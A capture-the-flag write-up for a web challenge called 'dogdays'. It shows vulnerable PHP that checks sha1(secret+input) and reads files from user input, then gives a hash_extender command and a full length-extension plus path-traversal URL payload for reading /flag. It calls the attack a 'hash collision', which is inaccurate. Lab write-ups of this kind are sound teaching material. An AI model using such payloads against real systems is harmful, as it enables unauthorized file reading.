### Challenge ###

dogdays
382
Medium
Woof woof

http://chal.competitivecyber.club:7777

Author: Dylan (elbee3779)

### Solution ###
We are given the source code of this website but we are only going to look at tge important thing to us.
view.php:
```
<?php
	$pic = $_GET['pic'];
	$hash = $_GET['hash'];
	if(sha1("TEST SECRET1".$pic)==$hash){
		$imgdata = base64_encode(file_get_contents("pupper/".str_replace("\0","",$pic)));
		echo "<!DOCTYPE html>";
		echo "<html><body><h1>Here's your picture:</h1>";
		echo "<img src='data:image/png;base64,".$imgdata."'>";
		echo "</body></html>";
	}else{
		echo "<!DOCTYPE html><html><body>";
		echo "<h1>Invalid hash provided!</h1>";
		echo '<img src="assets/BAD.gif"/>';
		echo "</body></html>";
	}
	// The flag is at /flag, that's all you're getting!
?>
```

After reading the code we can figure out that it is a sha1 hash collision attack.
We can exploit it using : https://github.com/iagox86/hash_extender
This tool is created to find hash collisions we need the secret length which is 12 a vaild hash and a known hash. Luckily we have all three of these so we can just run the tool

```
./hash_extender --out-data-format=html --data '2.png' --secret 12 --append '/../../../../../../../flag' --signature 6e52c023e823622a86e124824efbce29d78b2e73 --format sha1
```

it gives us the final hash '0f823850f0294942f8813013d9e2ec6bc3ada079' we can use this and get the flag.

Final payload:```
http://chal.competitivecyber.club:7777/view.php?hash=0f823850f0294942f8813013d9e2ec6bc3ada079&pic=2%2epng%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%88%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag
```
